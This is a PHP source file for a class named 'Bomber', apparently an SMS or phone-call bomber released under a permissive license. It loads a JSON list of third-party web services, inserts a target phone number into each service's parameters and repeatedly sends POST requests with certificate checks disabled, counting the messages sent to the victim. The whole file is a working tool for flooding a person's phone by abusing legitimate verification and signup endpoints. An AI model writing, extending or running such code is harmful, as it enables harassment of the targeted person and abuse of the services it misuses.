<?php

/*
 *   ____          _  _          _           _
 *  |  _ \   ___  | || | \ \/ / | |  _ _    (_)
 *  | |_) ) / _ \ | || |  \  /  | | | '_ \  | |
 *  |  __ \| (_) || || |  / /   | | | | | | | |
 *  |_|  \_\\___/ |_||_| /_/    |_| |_| |_| |_|
 *                                               
 *  Copyright (c) september 2019 Rolly lni <vk.com/rollylni>
 *  Permission is hereby granted, free of charge, to any person obtaining a copy
 *  of this software and associated documentation files (the "Software"), to deal
 *  in the Software without restriction, including without limitation the rights
 *  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 *  copies of the Software, and to permit persons to whom the Software is
 *  furnished to do so, subject to the following conditions:
 *
 *  The above copyright notice and this permission notice shall be included in all
 *  copies or substantial portions of the Software.
 *  
 */
 
class Bomber {
    
    /** @var string*/
    public $number = null;

    /** @var float*/
    private $start_time = 0.00;
    
    /** @var bool*/
    private $stopped = false;
    
    /** @var int*/
    private $counter = 0;
    
    /** @var array*/
    private $formats = [];
    
    /** @var array*/
    private $services = [];
    
    /**
     * 
     * @param string  $number - phone number
     */
    public function __construct($number = null) {
        $this->number = $number;
    }
    
    /**
     * 
     * @param string $number
     */
    public function setNumber($number = null) {
        $this->number = $number;
    }
    
    /**
     * 
     * @param string $name
     * @param Closure $func
     */
    public function addFormat($name, Closure $func) {
        $this->formats[$name] = $func;
    }
    
    /**
     * 
     * @param string $key
     * @param string $number
     * 
     * @return mixed
     */
    public function getFormat($name, $number) {
        if(isset($this->formats[$name])) {
            return $this->formats[$name](trim($number));
        }
        return null;
    }
    
    /**
     * 
     * @param string $file
     * 
     * @return bool
     */
    public function setFile($file) {
        if(file_exists($file)) {
            $file = json_decode(file_get_contents($file), true);
            if($file === null) {
                return false;
            }
            
            foreach($file as $key => $value) {
                if(!is_array($value) or !is_string($key)) {
                    continue;
                }
                
                if(!isset($value["url"]) or !isset($value["params"])) {
                    continue;
                }
                
                if(!is_array($value["params"])) {
                    continue;
                }
                
                if(!isset($value["format"])) {
                    $value["format"] = null;
                }
                $this->addService($key, $value["url"], $value["params"], $value["format"]);
            }
            return true;
        }
        return false;
    }
    
    /**
     * 
     * @param string $key
     * @param string $url
     * @param array  $params
     * @param string $fomat
     */
    public function addService($key, $url, array $params, $format = null) {
        $this->services[$key] = [
            "format" => $format,
            "params" => $params,
            "url" => $url
        ];
    }
    
    /**
     * 
     * @param string $key
     * 
     * @return mixed
     */
    public function getService($key) {
        return $this->services[$key] ?? null;
    }
    
    /**
     * 
     * @return array
     */
    public function getServices() {
        return $this->services;
    }
    
    /**
     * 
     * @param string $url
     * @param array  $params
     * 
     * @return bool
     */
    private function postURL($url, array $params = []) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url . http_build_query($params));
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        $response = curl_exec($ch);
        curl_close($ch);
        return $response;
    }
    
    /**
     * 
     * @param integer $interval - message sending interval
     * @param integer $count - messages count
     * 
     * @return array - result
     */
    public function start(int $interval = 1000, int $count = 20) {
        if(!extension_loaded("curl")) {
            echo "[CRITICAL] please install cURL extension!\n";
            return [];
        }
        if($this->number === null) return [];
        $this->start_time = microtime(true);
        $this->stopped = false;
        $this->counter = 0;
        echo "[INFO] starting...\n";
        echo "[INFO] to ".$this->number."\n";
        while(true) {
            if($this->stopped or $this->getServices() === []) {
                break;
            }
            
            foreach($this->getServices() as $v) {
                if($this->counter >= $count) {
                    break 2;
                }
                
                $number = $this->number;
                
                if($v["format"] !== null) {
                    $format = $this->getFormat($v["format"], $number);
                    if($format !== null) {
                        $number = $format;
                    }
                }
                
                foreach($v["params"] as $key => $value) {
                    $v["params"][$key] = str_replace(["%number%", "%count%", "%uptime%"], [$number, $this->counter, $this->getUptime()], $value);
                } 
                
                if(!$this->postURL($v["url"], $v["params"])) {
                    continue;
                }
                $this->counter++;
                usleep($interval * 1000);
            }
        }
        echo "[INFO] successfully sended on ".$this->number."\n";
        echo "[INFO] sended ".$this->counter." messages for ".$this->getUptime()." sec.\n";
        return [
            "count" => $this->getCounter(),
            "number" => $this->getNumber(),
            "uptime" => $this->getUptime(),
            "services" => count($this->getServices())
        ];
    }

    /**
     * 
     * @return int
     */
    public function getCounter() {
        return $this->counter;
    }
    
    /**
     * 
     * @return string
     */
    public function getNumber() {
        return $this->number;
    }
    
    /**
     * 
     * @return string
     */
    public function getUptime() {
        return trim(round(microtime(true) - $this->start_time, 3), "-");
    }
    
    /**
     * 
     * @param $bool
     */
    public function stop($bool = true) {
        $this->stopped = true;
    }
}